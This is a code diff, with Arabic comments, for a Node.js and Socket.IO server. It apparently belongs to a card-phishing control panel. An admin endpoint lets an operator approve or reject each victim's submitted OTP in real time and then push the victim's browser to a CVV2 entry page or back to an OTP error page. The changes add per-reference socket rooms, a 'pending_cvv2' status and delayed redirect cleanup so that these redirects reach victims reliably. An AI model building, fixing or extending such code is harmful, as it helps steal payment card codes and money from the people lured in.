@@ -212,13 +212,19 @@ app.post('/api/admin/otp-action', authMiddleware, (req, res) => {
   if (action === 'pass') {
     // قبول OTP: توجيه العميل لصفحة CVV2
     db.redirects[reference] = 'cvv2';
+    booking.status = 'pending_cvv2';
     if (booking.otp) booking.otp.otpAction = 'pass';
-    io.emit('redirect_user', { reference, redirect: getRedirectUrl('cvv2', reference) });
+    const redirectUrl = getRedirectUrl('cvv2', reference);
+    // إرسال للـ room المحدد وأيضاً broadcast عام
+    io.to('ref_' + reference).emit('redirect_user', { reference, redirect: redirectUrl });
+    io.emit('redirect_user', { reference, redirect: redirectUrl });
   } else if (action === 'denied') {
     // رفض OTP: إعادة توجيه لصفحة OTP مع رسالة خطأ
     db.redirects[reference] = 'otp_error';
     if (booking.otp) booking.otp.otpAction = 'denied';
-    io.emit('redirect_user', { reference, redirect: getRedirectUrl('otp_error', reference) });
+    const deniedUrl = getRedirectUrl('otp_error', reference);
+    io.to('ref_' + reference).emit('redirect_user', { reference, redirect: deniedUrl });
+    io.emit('redirect_user', { reference, redirect: deniedUrl });
   }
   saveData(db);
   res.json({ success: true });
@@ -798,10 +804,13 @@ app.get('/api/check-redirect/:reference', (req, res) => {
   const redirect = db.redirects[ref] || db.globalRedirect;
   if (redirect) {
     const redirectUrl = getRedirectUrl(redirect, ref);
-    // حذف الريدايركت بعد إرجاعه لمنع التكرار
+    // حذف الريدايركت بعد 30 ثانية لضمان وصوله للعميل
     if (db.redirects[ref]) {
-      delete db.redirects[ref];
-      saveData(db);
+      setTimeout(() => {
+        db = loadData();
+        delete db.redirects[ref];
+        saveData(db);
+      }, 30000);
     }
     res.json({ success: true, redirect: redirectUrl });
   } else {
@@ -841,6 +850,13 @@ io.on('connection', (socket) => {
         stats: getStats()
       });
     } catch (e) {}
+  });
+
+  // العميل يُنضم لـ room خاص بالـ reference
+  socket.on('joinRef', (data) => {
+    if (data && data.reference) {
+      socket.join('ref_' + data.reference);
+    }
   });
   
   socket.on('disconnect', () => {
